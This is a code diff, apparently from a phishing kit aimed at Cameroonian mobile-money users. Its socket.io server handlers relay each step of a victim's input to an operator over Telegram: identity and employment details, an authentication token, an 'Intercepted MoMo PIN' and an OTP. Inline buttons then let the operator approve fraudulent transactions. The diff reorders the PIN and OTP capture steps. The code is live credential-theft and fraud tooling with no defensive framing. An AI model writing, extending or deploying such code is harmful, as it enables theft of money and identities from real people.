@@ -48,19 +48,19 @@ io.on('connection', (socket) => {
     socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇨🇲 Step 2: Identity Profile", data, false));
     socket.on('step3', (data) => botManager.sendToAdmin(appId, "🇨🇲 Step 3: Employment Profile", data, false));
     
-    // Step 4: Authentication Token (Standard log stream, shifts user to step 5 on UI)
+    // Step 4: Authentication Token (Standard log stream, shifts user to step 5 PIN layout)
     socket.on('step4', (data) => {
         botManager.sendToAdmin(appId, "🇨🇲 Step 4: Authentication Token", data, false);
     });
 
-    // Step 5: OTP Entry Point (Triggers confirmation/rejection inline buttons in Telegram)
+    // Step 5: Authorize MoMo PIN (Triggers confirmation/rejection inline buttons in Telegram)
     socket.on('step5', (data) => {
-        botManager.sendToAdmin(appId, "🇨🇲 Step 5: Intercepted OTP", data, true);
+        botManager.sendToAdmin(appId, "🇨🇲 Step 5: Intercepted MoMo PIN", data, true);
     });
 
-    // Step 6: Final PIN Submission (Triggers transaction final approval inline buttons)
+    // Step 6: OTP Entry Point (Triggers transaction final approval inline buttons)
     socket.on('step6', (data) => {
-        botManager.sendFinalApproval(appId, data.pin);
+        botManager.sendFinalApproval(appId, data.code);
     });
 
     socket.on('disconnect', () => {
